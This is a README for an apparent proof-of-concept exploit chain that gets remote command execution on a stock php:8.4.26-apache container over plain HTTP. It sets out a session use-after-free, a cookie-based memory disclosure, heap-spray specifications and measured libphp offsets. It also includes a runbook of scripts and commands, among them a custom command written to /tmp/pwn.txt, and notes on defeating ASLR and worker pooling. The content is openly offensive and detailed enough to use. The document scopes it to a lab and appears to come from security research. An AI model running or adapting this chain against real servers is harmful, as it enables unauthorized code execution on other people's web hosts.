# php2shell, pure HTTP, our own chain

Status: **the chain runs end to end with our tools** on a stock `php:8.4.26-apache` (aarch64, trixie,
official `php.ini-production` active, `memory_limit` 128M, **official MPM: `StartServers 5`,
`MaxRequestWorkers 150`, nothing overridden in the container**).

- single-worker lab baseline: 3/3 fresh containers -> `uid=33(www-data) gid=33(www-data)`;
- stock 150-worker configuration (`chain.sh --workers 150`, i.e. 149 half-sent connections held):
  **3/3**;
- one extra run with an arbitrary command line, so this is `system()`, not a fixed payload:

```
aarch64
27a3b63bf5cd
33
```

Nothing in the chain reads the target's `/proc`, attaches a debugger to it, or writes a file to the
target filesystem ahead of time. gdb appears only in the instruments used to *verify* constants, never
in a delivery run.

## The chain

| step | request | what it does |
|---|---|---|
| A1 | `a1_arm.py` | header amplification OOMs at `php_url_encode` (`tried to allocate 4096`) with the session still holding an id, leaving `PS(id)` dangling in a chunk the engine then recycles |
| B1 | `b1_forge.py --spec …` | rebuilds that chunk with a forged `zend_string` header, so the cookie encode reads 800 KB past it: 819 200 disclosed bytes |
| — | `leak_addrs.py` | turns the cookie into `libphp`, `main`, `S`, `hsv`, `zif_system` |
| A2 | `a2_cheap_oom.py` | OOMs *inside* the multipart parser (`tried to allocate 20480`) on nested empty file fields, which skips module shutdown and leaves the stale zval slots in place |
| B2 | `mk_fake_ht.py` + `b2_exec.py` | sprays 384-byte values carrying a fake `zend_reference` (ptr = `S`) and one `ht` field carrying a fake `zend_array`, then lets the session shutdown destroy it |
| — | shutdown | `Z_ARRVAL->pDestructor` is `zif_system`, the fake execute_data supplies `cmd` as its first argument: `system(cmd)` |

## Address model

Every value below is measured on this image, not taken from another build.

| symbol | value | how it was established |
|---|---|---|
| `zval_ptr_dtor` | `libphp + 0x638120` | 876 copies appear in the disclosed window; gdb confirms the same 876 in the chunk |
| `zif_system` | `libphp + 0x42CD70` | gdb `&zif_system` |
| `zend_hash_destroy` | `libphp + 0x5EEFC8` | gdb, used as a second fingerprint |
| `php_url_encode` | `libphp + 0x484820` | gdb, names the disclosure site |
| main chunk | disclosed chunk `+ 0x400000` | leak cluster compared with `alloc_globals->heap`: `0x7fff96600000` from both |
| `S` | main `+ 0xF8398` | the slot the `ht` value has to occupy |
| `hsv` | main `+ 0x7D720` | the stale zval slot the spray has to cover |

`S` and `hsv` are the reference lab's layout constants. They held here unchanged, which is expected:
same image, same ini, same arming shapes. They are the first thing to re-measure on a different image
(`gdb/chain_state.gdb` prints both slots and which `ps_globals` field points at them).

## Two details that decide whether the leak is usable at all

1. **The window must contain real HashTables.** A value that ends at the forged header fills the chunk
   to page 0x137 and frees nothing, so the only pointers in the window are chunk addresses. The spec
   `G:511:0x137*14,G:400:0x137,X:900` fills one chunk to page 0x190 only, leaving pages 0x191-0x1ff
   free; 900 nested POST arrays are then carved out of that hole, and each `zend_array` puts
   `zval_ptr_dtor` right there.
2. **The cookie is `urlencode`, not `rawurlencode`.** Byte `0x20` travels as `+`, and
   `zval_ptr_dtor`'s low byte *is* 0x20, so `…8120` arrives as `…812b`. Undoing that is lossless (a
   literal `0x2b` is sent as `%2B`) but mandatory; `decode_leak_cookie.py` does it.

## Runbook

The whole thing is menu-driven:

```bash
cd POC_Final
bash poc/poc_menu.sh          # interactive: 1-4, or `poc_menu.sh 1` for one action
```

```
1) full chain, official MPM (150 workers)
2) full chain, single-worker baseline
3) full chain with a custom command
4) disclosure only, ASLR check (5 containers)
```

Each action starts its own fresh container, so runs never inherit a previous worker's addresses.
`--loops N` changes the ASLR loop count. The same steps by hand:

```bash
cd POC_Final

# single-worker baseline
bash lab/start_target.sh --single
bash poc/chain.sh
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)

# official MPM (StartServers 5 / MaxRequestWorkers 150): hold 149 children first
bash lab/start_target.sh
bash poc/chain.sh --workers 150

# arbitrary command
bash poc/chain.sh --workers 150 \
     --cmd 'uname -m > /tmp/pwn.txt; id -u >> /tmp/pwn.txt' --proof /tmp/pwn.txt
```

`chain.sh` prints the leaked address set on every run; with ASLR each container gives a different
`libphp`, `main`, `S` and `hsv`, and the chain still lands.

Before A1 it runs `poc/preflight.py` (reachability, PHP version, front end, and — with `--probe
/probe.php` — SAPI, ini and pool size) and stops on an incompatible target. After A1 it runs
`poc/arming_gate.py`, which requires the `tried to allocate 4096` refusal before B1 is spent: a
different size means the build charges its limits differently and the disclosure cannot work. On a
target without a readable container log the gate exits `4` (unverified); `--allow-unverified`
continues anyway. `--skip-preflight` skips the first gate.

The gate prefers the container log over the response body and uses one or the other, never both: a body
that happens to contain `4096` while the log names a 2 MiB refusal would otherwise be read as "armed",
with the authoritative source cited as evidence for the opposite. When docker is not on `PATH`, or the
log carries no allocation size, the gate says so rather than silently falling back.

**A target that arms but cannot disclose.** On 8.5.11 the arming step reproduces exactly, and B1 then
returns nothing, because `PS(id)` is handed to the encoder as a refcounted copy of someone else's string
instead of a fresh object — `php_session_send_cookie` is never called, so there is nothing to leak. The
gate passes and the chain fails one step later, which is misleading. Preflight therefore reports this
build as `ARMING-ONLY` and exits `5`; `--allow-arming-only` accepts it, runs preflight, A1 and the gate,
then stops with exit `6` and a message saying the arming instrument was verified and B1 was not
attempted. Use it to validate the detector against a known-positive build, not as a chain attempt.

## Tools

| file | role |
|---|---|
| `poc/preflight.py` | recon and hard gate: PHP version, front end/SAPI, ini, pool size; refuses an incompatible target |
| `poc/arming_gate.py` | reads the A1 evidence and refuses B1 unless the failure is the 4096-byte encode-site refusal |
| `poc/a1_arm.py` | A1 arming (also the tool that pinned the 4096 OOM site and page 0x137) |
| `poc/b1_forge.py` | B1 builder: `--spec`, `--tag`, `--save-cookie`, narrow and wide windows |
| `poc/decode_leak_cookie.py` | decoder: engine-faithful `+`/`%XX` handling, symbol subtraction, cluster voting |
| `poc/leak_addrs.py` | cookie -> `LIBPHP/MAIN/S/HSV/ZIF_SYSTEM`, `--emit shell` |
| `poc/a2_cheap_oom.py` | A2: nested empty file fields + fillers, OOM inside the parser |
| `poc/mk_fake_ht.py` | fake `zend_array` + execute_data + `zend_string` carrier |
| `poc/b2_exec.py` | fake-reference spray and `ht` field, the trigger |
| `poc/hold_workers.py` | occupies `MaxRequestWorkers - 1` children so the chain stays on one process |
| `poc/chain.sh` | the four steps plus proof retrieval (`--workers N` for stock MPM) |
| `poc/poc_menu.sh` | numbered runner: 1 stock MPM chain, 2 single-worker chain, 3 custom command, 4 ASLR check |

Instruments (`gdb/`): `a2_state.gdb` (post-A2 slots and layout), `chain_state.gdb` (libphp, main, S,
hsv in one process), `b_tail_live.gdb` / `b_dtor_tag.gdb` (what the disclosure encode actually reads),
`b_tail_probe.gdb` (module pointers in the chunk after a request), `delta_probe.gdb` (records that
`libphp - chunk` is not a usable constant). They need no debug build: the official image's symbol table
is enough for `&ps_globals`, `&alloc_globals`, `&zval_ptr_dtor` and `&zif_system`.

## Limits

The chain runs on one measured configuration: `php:8.4.26-apache`, prefork mod_php, one worker, no proxy
in front, `memory_limit=128M`, `cleanup=On`. Every other configuration that was measured fails at a
specific, named step — see the table in the [README](../README.md#how-often-this-actually-works). In short:
8.4.27 and later do not arm, 8.5.11 arms without disclosing, FPM replaces the worker on bailout, and a
proxy with the default 1 MiB body limit stops the arming request before PHP sees it.

That is the number to quote to a client. Anything short of a proof file read out of their own environment
is a compatibility estimate.

- **Worker count.** Both configurations are covered: the single-worker lab (nothing to hold) and the
  stock MPM, where `--workers 150` first occupies `MaxRequestWorkers - 1` children with half-sent
  requests (`poc/hold_workers.py`) so every step lands on the same child. A target with a different
  `MaxRequestWorkers` needs that number passed in. On x86-64 the pinned stock-MPM run was 1/3 — the
  free child rotates even with the sockets held.
- **Configuration dependence.** The chain needs `session.upload_progress.cleanup=On` (default),
  `display_errors=Off`, an active `php.ini`, `memory_limit` 128M, and the exact `--big 78` arming
  shape. `--fillers 115` is layout-tuned: a different image moves `hsv`/`S` and needs a re-measure.
- **Aftermath.** The worker segfaults after the command runs (expected: the fake array is destroyed by
  the same call path that then unwinds). That is also why the proof goes to a file.
- **Scope.** Lab target only. Nothing here should be pointed at a system without written permission.
